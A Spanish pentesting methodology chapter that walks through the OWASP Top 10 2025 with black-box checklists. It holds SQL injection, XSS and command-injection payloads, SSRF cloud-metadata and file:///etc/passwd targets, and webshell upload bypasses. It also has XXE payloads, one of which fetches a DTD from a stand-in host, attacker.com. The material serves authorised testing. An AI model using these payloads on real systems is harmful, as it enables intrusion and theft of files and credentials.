# 05 - Fase 3: Analisis de Vulnerabilidades

## Tabla de Contenidos

- [OWASP Top 10 - 2025](#owasp-top-10---2025)
  - A01: Broken Access Control | A02: Security Misconfiguration | A03: Supply Chain
  - A04: Cryptographic Failures | A05: Injection | A06: Insecure Design
  - A07: Authentication | A08: Data Integrity | A09: Logging | A10: Exceptional Conditions
- [Vulnerabilidades Adicionales Criticas](#vulnerabilidades-adicionales-criticas) — SSRF, File Upload, XXE, Race Conditions

## OWASP Top 10 - 2025

La clasificacion mas actualizada de riesgos en aplicaciones web.

### A01:2025 - Broken Access Control

**Descripcion:** Falta de control sobre que recursos y acciones puede realizar cada usuario. Es el riesgo #1 por su prevalencia y impacto.

**Pruebas en caja negra:**
```
IDOR (Insecure Direct Object Reference)
- Modificar IDs en URLs: /api/users/123 -> /api/users/124
- Cambiar IDs en cuerpo de peticiones POST/PUT
- Probar referencias en cookies y tokens JWT

Escalacion vertical de privilegios
- Acceder a funciones de admin como usuario normal
- Modificar parametros de rol: role=user -> role=admin
- Acceder a endpoints administrativos: /admin, /dashboard

Escalacion horizontal de privilegios
- Acceder a datos de otros usuarios del mismo rol
- Modificar parametros de usuario en sesion

Bypass de controles
- Manipular metodos HTTP: GET -> POST -> PUT -> DELETE
- Path traversal en URLs: /admin/../../../etc/passwd
- Cambiar IP de origen con headers: X-Forwarded-For, X-Original-URL
- Force browsing a paginas no enlazadas

CORS misconfiguration
- Verificar Access-Control-Allow-Origin refleja origenes arbitrarios
- Probar con null origin
```

---

### A02:2025 - Security Misconfiguration

**Descripcion:** Configuraciones por defecto, incompletas o inseguras en cualquier nivel del stack.

**Pruebas en caja negra:**
```
Configuraciones por defecto
- Credenciales por defecto en paneles de admin
- Paginas de error con stack traces/debug info
- Directory listing habilitado
- Archivos de configuracion accesibles (.env, web.config)

Headers de seguridad ausentes
- Falta de HSTS, CSP, X-Frame-Options, X-Content-Type-Options
- CORS configurado como Access-Control-Allow-Origin: *

Servicios innecesarios expuestos
- phpinfo(), server-status, server-info
- Paneles de debug: Django debug toolbar, Spring Actuator
- Swagger/API docs en produccion sin autenticacion

Versiones desactualizadas
- Software con versiones con CVEs conocidos
- Frameworks/librerias desactualizadas

Cloud misconfiguration
- S3 buckets publicos
- Azure Blob Storage sin autenticacion
- Firebase databases abiertas
```

---

### A03:2025 - Software Supply Chain Failures

**Descripcion:** Nueva categoria que abarca componentes vulnerables de terceros y ataques a la cadena de suministro.

**Pruebas en caja negra:**
```
Librerias JS expuestas con versiones vulnerables
- Analizar archivos JS cargados por la pagina
- Verificar versiones en CDNs: jQuery, Angular, React, etc.
- Retire.js para detectar librerias JS vulnerables

Dependencias con CVEs conocidos
- Identificar versiones de software (headers, archivos)
- Buscar CVEs asociados en NVD/Exploit-DB

Integraciones de terceros
- Scripts de terceros cargados sin integridad (no SRI)
- CDNs o dominios de terceros comprometibles
```

---

### A04:2025 - Cryptographic Failures

**Pruebas en caja negra:**
```
TLS/SSL
- Versiones de protocolo inseguras (TLS 1.0, 1.1, SSLv3)
- Cipher suites debiles (RC4, DES, export)
- Certificados expirados, self-signed o con CN incorrecto
- Falta de HSTS

Datos en transito
- Formularios que envian datos por HTTP
- Mixed content (HTTPS carga recursos HTTP)
- Cookies sin flag Secure

Almacenamiento de credenciales
- Passwords en respuestas de API
- Tokens/API keys en HTML/JS del frontend
- Hashes debiles expuestos (MD5, SHA1 sin salt)

Criptografia debil
- Tokens predecibles o secuenciales
- IDs de sesion con baja entropia
- JWT con alg:none o clave debil
```

---

### A05:2025 - Injection

**Pruebas en caja negra:**
```
SQL Injection
- Parametros GET/POST con comilla simple: test'
- Error-based: ' OR 1=1--
- Boolean-based: ' AND 1=1-- vs ' AND 1=2--
- Time-based: ' OR SLEEP(5)--
- UNION-based: ' UNION SELECT NULL,NULL--
- Probar en: login forms, search, filtros, APIs

Cross-Site Scripting (XSS)
- Reflected: <script>alert(1)</script> en parametros
- Stored: inyectar en campos que se almacenan (comentarios, perfiles)
- DOM-based: analizar sinks en JS (innerHTML, eval, document.write)
- Payloads de bypass: <img onerror=alert(1) src=x>, <svg onload=alert(1)>

Command Injection
- Concatenacion: ; ls, | cat /etc/passwd, `whoami`
- Probar en parametros que interactuan con el sistema

LDAP Injection
- Caracteres especiales: *, (, ), \, NUL

Server-Side Template Injection (SSTI)
- Payloads: {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>
- Identificar motor de templates por comportamiento

NoSQL Injection
- MongoDB: {"$gt": ""}, {"$ne": ""}
- Probar en APIs JSON
```

---

### A06:2025 - Insecure Design

**Pruebas en caja negra:**
```
Logica de negocio
- Comprar productos con precio negativo
- Saltar pasos en flujos multi-step
- Race conditions en operaciones criticas
- Abusar de funcionalidades de referral/cupones

Falta de rate limiting
- Brute force en login sin bloqueo
- Enumeracion de usuarios sin limite
- Spam de funcionalidades (emails, SMS)

Flujos inseguros
- Reset de password predecible
- OTP reutilizable o con ventana excesiva
- Registro sin verificacion de email
```

---

### A07:2025 - Authentication Failures

**Pruebas en caja negra:**
```
Brute force
- Probar credenciales comunes: admin/admin, admin/password
- Credential stuffing con listas de breaches
- Verificar bloqueo de cuenta despues de N intentos

Enumeracion de usuarios
- Diferencias en respuestas de login (usuario invalido vs password invalida)
- Enumeracion via forgot password
- Enumeracion via registro

Gestion de sesiones
- Tokens de sesion predecibles
- Session fixation
- No invalidacion de sesion al cambiar password
- Sesion no expira (timeout excesivo)

Autenticacion debil
- Falta de MFA en funciones criticas
- Remember me inseguro
- Password reset token predecible o sin expiracion
- OAuth misconfiguration (open redirect, state manipulation)

JWT
- Algoritmo none: {"alg":"none"}
- Cambiar RS256 a HS256 (confusion de algoritmo)
- Brute force de clave simetrica
- Token sin expiracion (no exp claim)
```

---

### A08:2025 - Software and Data Integrity Failures

**Pruebas en caja negra:**
```
- Actualizaciones sin verificacion de integridad
- Deserializacion insegura (Java, PHP, .NET, Python)
- CI/CD pipeline expuesto o accesible
- Falta de Subresource Integrity (SRI) en scripts externos
```

---

### A09:2025 - Security Logging and Monitoring Failures

**Pruebas en caja negra:**
```
- Verificar si actividad maliciosa genera alertas
- Probar si login fallidos repetidos generan bloqueo/notificacion
- Comprobar si accesos a recursos restringidos se registran
- Evaluar tiempo de deteccion y respuesta
```

---

### A10:2025 - Mishandling of Exceptional Conditions

**Nueva categoria en 2025.** Cubre manejo improper de errores y condiciones excepcionales.

**Pruebas en caja negra:**
```
Manejo de errores
- Enviar inputs malformados (null bytes, unicode, overlength)
- Provocar errores 500 y analizar mensajes expuestos
- Stack traces que revelan tecnologias/rutas/versiones

Condiciones excepcionales
- Enviar tipos de datos inesperados (string donde espera int)
- Valores limite: 0, -1, MAX_INT, cadenas muy largas
- Requests malformados: headers extra largos, bodies truncados
- File uploads con extensiones inesperadas, archivos vacios, archivos enormes

Fail open
- Verificar si errores en autenticacion/autorizacion otorgan acceso
- Probar si errores en validacion permiten bypass
```

---

## Vulnerabilidades Adicionales Criticas

### SSRF (Server-Side Request Forgery)

```
Vectores de prueba:
- Parametros que aceptan URLs: url=, redirect=, img=, load=
- Probar acceso a metadata de cloud:
  - AWS: http://169.254.169.254/latest/meta-data/
  - GCP: http://metadata.google.internal/computeMetadata/v1/
  - Azure: http://169.254.169.254/metadata/instance

Payloads:
- http://127.0.0.1
- http://localhost
- http://0.0.0.0
- http://[::1]
- http://0x7f000001
- file:///etc/passwd
- gopher://127.0.0.1:25/
```

### File Upload Vulnerabilities

```
Pruebas:
- Subir webshell con extension permitida (.php.jpg, .phtml)
- Bypass de content-type validation
- Bypass de extension con null byte: shell.php%00.jpg
- SVG con XSS embebido
- Polyglot files (imagen valida + codigo ejecutable)
- Path traversal en nombre de archivo: ../../shell.php
```

### XXE (XML External Entity)

```xml
Payload basico:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

Blind XXE (exfiltracion via OOB):
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

### Race Conditions

```
Pruebas:
- Enviar multiples requests simultaneos a funciones criticas
- Canjear cupon/codigo multiples veces en paralelo
- Transferencias de dinero simultaneas
- Herramientas: Caido Automate (concurrencia alta), Turbo Intruder, race-the-web
```
